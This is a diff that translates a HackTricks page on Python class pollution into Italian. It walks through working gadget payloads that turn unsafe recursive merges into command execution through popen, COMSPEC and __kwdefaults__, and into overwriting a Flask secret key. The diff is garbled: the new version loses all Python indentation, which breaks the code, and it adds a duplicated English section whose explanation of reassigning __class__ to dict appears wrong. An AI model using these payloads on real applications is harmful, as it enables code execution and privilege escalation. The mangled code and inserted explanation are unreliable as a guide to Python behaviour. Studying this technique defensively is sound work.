@@ -1,23 +1,22 @@
-# Class Pollution (Python's Prototype Pollution)
+# Inquinamento delle classi (Prototype Pollution di Python)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.
 
 </details>
 
-## Basic Example
+## Esempio di base
 
-Check how is possible to pollute classes of objects with strings:
-
+Verifica come è possibile inquinare le classi degli oggetti con le stringhe:
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -41,9 +40,75 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
+## Esempio di Vulnerabilità di Base
 
-## Basic Vulnerability Example
+Consider the following Python code:
 
+```python
+class Person:
+    def __init__(self, name, age):
+        self.name = name
+        self.age = age
+
+person = Person("Alice", 25)
+print(person.name)
+```
+
+This code defines a `Person` class with a constructor that takes in a `name` and an `age`. It then creates an instance of the `Person` class with the name "Alice" and age 25, and prints out the name of the person.
+
+Now, let's say an attacker is able to modify the `Person` class definition and inject malicious code:
+
+```python
+class Person:
+    def __init__(self, name, age):
+        self.name = name
+        self.age = age
+        self.__class__ = dict
+
+person = Person("Alice", 25)
+print(person.name)
+```
+
+In this modified code, the attacker has changed the `__class__` attribute of the `person` object to `dict`. This means that the `person` object is no longer an instance of the `Person` class, but rather a dictionary.
+
+When the code tries to access the `name` attribute of the `person` object, it will raise an `AttributeError` because dictionaries do not have a `name` attribute. However, the code does not handle this error and will crash.
+
+This is an example of class pollution, where an attacker is able to modify the class definition and change the behavior of the code. In this case, the attacker was able to change the `__class__` attribute of the object, but there are other ways to pollute classes as well.
+
+## Esempio di Vulnerabilità di Base
+
+Considera il seguente codice Python:
+
+```python
+class Person:
+    def __init__(self, name, age):
+        self.name = name
+        self.age = age
+
+person = Person("Alice", 25)
+print(person.name)
+```
+
+Questo codice definisce una classe `Person` con un costruttore che prende un `name` e un `age`. Successivamente, viene creato un'istanza della classe `Person` con il nome "Alice" e l'età 25, e viene stampato il nome della persona.
+
+Ora, supponiamo che un attaccante sia in grado di modificare la definizione della classe `Person` e iniettare del codice maligno:
+
+```python
+class Person:
+    def __init__(self, name, age):
+        self.name = name
+        self.age = age
+        self.__class__ = dict
+
+person = Person("Alice", 25)
+print(person.name)
+```
+
+In questo codice modificato, l'attaccante ha cambiato l'attributo `__class__` dell'oggetto `person` in `dict`. Ciò significa che l'oggetto `person` non è più un'istanza della classe `Person`, ma piuttosto un dizionario.
+
+Quando il codice cerca di accedere all'attributo `name` dell'oggetto `person`, verrà generato un `AttributeError` perché i dizionari non hanno un attributo `name`. Tuttavia, il codice non gestisce questo errore e si bloccherà.
+
+Questo è un esempio di class pollution, in cui un attaccante è in grado di modificare la definizione della classe e cambiare il comportamento del codice. In questo caso, l'attaccante è riuscito a cambiare l'attributo `__class__` dell'oggetto, ma ci sono anche altri modi per inquinare le classi.
 ```python
 # Initial state
 class Employee: pass
@@ -52,37 +117,35 @@ print(vars(emp)) #{}
 
 # Vulenrable function
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 
 USER_INPUT = {
-    "name":"Ahemd",
-    "age": 23,
-    "manager":{
-        "name":"Sarah"
-    }
+"name":"Ahemd",
+"age": 23,
+"manager":{
+"name":"Sarah"
+}
 }
 
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-
-## Gadget Examples
+## Esempi di Gadget
 
 <details>
 
-<summary>Creating class property default value to RCE (subprocess)</summary>
-
+<summary>Creazione di un valore predefinito della proprietà di classe per RCE (subprocess)</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -90,31 +153,31 @@ class HR(Employee): pass # Class inherits from Employee class
 class Recruiter(HR): pass # Class inherits from HR class
 
 class SystemAdmin(Employee): # Class inherits from Employee class
-    def execute_command(self):
-        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+def execute_command(self):
+command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
+return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 USER_INPUT = {
-    "__class__":{
-        "__base__":{
-            "__base__":{
-                "custom_command": "whoami"
-            }
-        }
-    }
+"__class__":{
+"__base__":{
+"__base__":{
+"custom_command": "whoami"
+}
+}
+}
 }
 
 recruiter_emp = Recruiter()
@@ -129,30 +192,28 @@ merge(USER_INPUT, recruiter_emp)
 print(system_admin_emp.execute_command())
 #> [!] Executing: "whoami", output: "abdulrah33m"
 ```
-
 </details>
 
 <details>
 
-<summary>Polluting other classes and global vars through <code>globals</code></summary>
-
+<summary>Inquinamento di altre classi e variabili globali tramite <code>globals</code></summary>
 ```python
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class User:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 class NotAccessibleClass: pass
 
@@ -163,32 +224,30 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
-
 </details>
 
 <details>
 
-<summary>Arbitrary subprocess execution</summary>
-
+<summary>Esecuzione arbitraria di sottoprocessi</summary>
 ```python
 import subprocess, json
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 # Overwrite env var "COMSPEC" to execute a calc
 USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
@@ -197,39 +256,37 @@ merge(USER_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 ```
-
 </details>
 
 <details>
 
-<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Sovrascrittura di <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
-
+**`__kwdefaults__`** è un attributo speciale di tutte le funzioni, secondo la [documentazione](https://docs.python.org/3/library/inspect.html) di Python, è un "mapping di eventuali valori predefiniti per i parametri **solo keyword**". Inquinando questo attributo ci permette di controllare i valori predefiniti dei parametri solo keyword di una funzione, questi sono i parametri della funzione che vengono dopo \* o \*args.
 ```python
 from os import system
 import json
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def execute(*, command='whoami'):
-    print(f'Executing {command}')
-    system(command)
+print(f'Executing {command}')
+system(command)
 
 print(execute.__kwdefaults__) #> {'command': 'whoami'}
 execute() #> Executing whoami
@@ -242,24 +299,21 @@ print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
 ```
-
 </details>
 
 <details>
 
-<summary>Overwriting Flask secret across files</summary>
+<summary>Sovrascrivere il segreto di Flask tra i file</summary>
 
-So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access \_\_globals\_\_ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**. \
-Therefore, you **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
-
+Quindi, se puoi fare una class pollution su un oggetto definito nel file python principale del web ma **la cui classe è definita in un file diverso** rispetto a quello principale. Poiché per accedere a \_\_globals\_\_ nei payload precedenti è necessario accedere alla classe dell'oggetto o ai metodi della classe, sarai in grado di **accedere ai globals in quel file, ma non in quello principale**. \
+Di conseguenza, **non sarai in grado di accedere all'oggetto globale dell'app Flask** che ha definito la **chiave segreta** nella pagina principale:
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+In questo scenario hai bisogno di un gadget per attraversare i file per arrivare a quello principale per **accedere all'oggetto globale `app.secret_key`** per cambiare la chiave segreta di Flask e poter [**aumentare i privilegi** conoscendo questa chiave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
-
-A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
+Un payload come questo [da questo writeup](https://ctftime.org/writeup/36082):
 
 {% code overflow="wrap" %}
 ```python
@@ -267,30 +321,30 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 ```
 {% endcode %}
 
-Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.
+Utilizza questo payload per **cambiare `app.secret_key`** (il nome nella tua app potrebbe essere diverso) per poter firmare nuovi e più privilegiati cookie di Flask.
 
 </details>
 
-Check also the following page for more read only gadgets:
+Controlla anche la seguente pagina per ulteriori gadget di sola lettura:
 
 {% content-ref url="python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-## References
+## Riferimenti
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
